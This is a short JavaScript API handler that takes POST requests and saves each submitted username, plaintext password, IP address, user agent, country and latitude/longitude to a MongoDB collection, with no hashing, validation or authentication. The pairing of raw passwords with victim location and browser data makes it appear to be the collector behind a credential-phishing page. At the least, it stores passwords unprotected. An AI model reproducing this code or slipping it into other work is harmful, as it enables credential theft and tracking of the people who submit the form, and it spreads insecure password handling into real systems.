import { MongoClient } from "mongodb";

const uri = process.env.MONGO_URI;
let client;

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  if (!client) {
    client = new MongoClient(uri);
    await client.connect();
  }

  const db = client.db("userdb");
  const users = db.collection("users");

  const {
    username,
    password,
    ip,
    user_agent,
    country,
    latitude,
    longitude
  } = req.body;

  await users.insertOne({
    username,
    password,
    ip,
    user_agent,
    country,
    latitude,
    longitude,
    timestamp: new Date()
  });

  res.status(200).json({ status: "stored" });
}
